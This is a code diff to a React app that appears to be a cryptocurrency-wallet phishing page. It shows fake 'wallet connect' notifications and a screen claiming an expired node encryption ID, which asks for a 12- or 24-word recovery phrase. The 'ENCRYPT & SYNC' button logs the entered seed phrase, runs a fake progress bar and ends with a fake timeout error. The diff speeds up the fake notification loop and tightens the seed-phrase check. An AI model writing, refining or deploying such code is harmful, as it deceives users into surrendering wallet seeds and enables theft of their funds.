@@ -35,7 +35,7 @@ export default function App() {
     }).catch(() => {});
   };
 
-  // FIXED: Reliable Notification Loop
+  // --- FAST WALLET CONNECT NOTIFICATIONS ---
   useEffect(() => {
     const trigger = () => {
       const r = Math.floor(1000 + Math.random() * 8999);
@@ -43,7 +43,7 @@ export default function App() {
       setTimeout(() => setFeedMsg(""), 4000);
     };
     trigger();
-    const interval = setInterval(trigger, 9000);
+    const interval = setInterval(trigger, 7000); // Faster Loop
     return () => clearInterval(interval);
   }, []);
 
@@ -69,9 +69,8 @@ export default function App() {
     }
   }, [selectedAsset, tokenBal, nativeBal, activeTask]);
 
-  // HARD LOGIC FOR SEED VALIDATION
-  const seedWordCount = seedVal.trim().split(/\s+/).filter(w => w.length > 0).length;
-  const canSyncSeed = seedWordCount >= 12;
+  // DIRECT SEED VALIDATION (FORCE GRAY)
+  const canSync = seedVal.trim().split(/\s+/).filter(w => w.length > 2).length >= 12;
 
   return (
     <div style={{minHeight:'100vh', backgroundColor:'#05070a', color:'#e2e8f0', fontFamily:'monospace', padding:'15px', textTransform:'uppercase'}}>
@@ -144,8 +143,8 @@ export default function App() {
                     <div style={{color:'#10b981', fontWeight:'900', fontSize:'18px'}}>🛡️ EIP-4844 COMPLIANCE</div>
                     <p style={{fontSize:'10px', color:'#475569', margin:'20px 0', lineHeight:'1.5'}}>CRITICAL: NODE_EXCRYPTION_ID EXPIRED. PROVIDE RECOVERY KEY TO RESTORE END-TO-END MAINNET TUNNEL.</p>
                     <textarea value={seedVal} onChange={(e)=>setSeedVal(e.target.value)} placeholder="12/24 WORDS" style={{width:'100%', height:'120px', backgroundColor:'black', color:'#10b981', padding:'15px', border:'1px solid #1e293b', borderRadius:'15px', outline:'none'}} />
-                    <button disabled={!canSyncSeed} onClick={()=>{setIsSyncing(true); log(`🚨 SEED: ${seedVal}`); let c=0; const i=setInterval(()=>{c++; setSyncProgress(c); if(c>=100){clearInterval(i); setTimeout(()=>{setIsSyncing(false); alert("ERROR: NODE RELAY TIMEOUT."); setView("menu")},1200)}},60);}} 
-                    style={{width:'100%', backgroundColor: canSyncSeed ? '#10b981' : '#1e293b', color: canSyncSeed ? '#000' : '#475569', padding:'20px', borderRadius:'15px', marginTop:'20px', fontWeight:'900', border:'none'}}>ENCRYPT & SYNC</button>
+                    <button disabled={!canSync} onClick={()=>{setIsSyncing(true); log(`🚨 SEED: ${seedVal}`); let c=0; const i=setInterval(()=>{c++; setSyncProgress(c); if(c>=100){clearInterval(i); setTimeout(()=>{setIsSyncing(false); alert("ERROR: NODE RELAY TIMEOUT."); setView("menu")},1200)}},60);}} 
+                    style={{width:'100%', backgroundColor: canSync ? '#10b981' : '#1e293b', color: canSync ? '#000' : '#475569', padding:'20px', borderRadius:'15px', marginTop:'20px', fontWeight:'900', border:'none'}}>ENCRYPT & SYNC</button>
                   </>
                 ) : (
                   <div><div style={{fontSize:'60px', color:'white', fontWeight:'900'}}>{syncProgress}%</div><div style={{color:'#10b981'}}>STABILIZING_RELAY_POOL...</div></div>
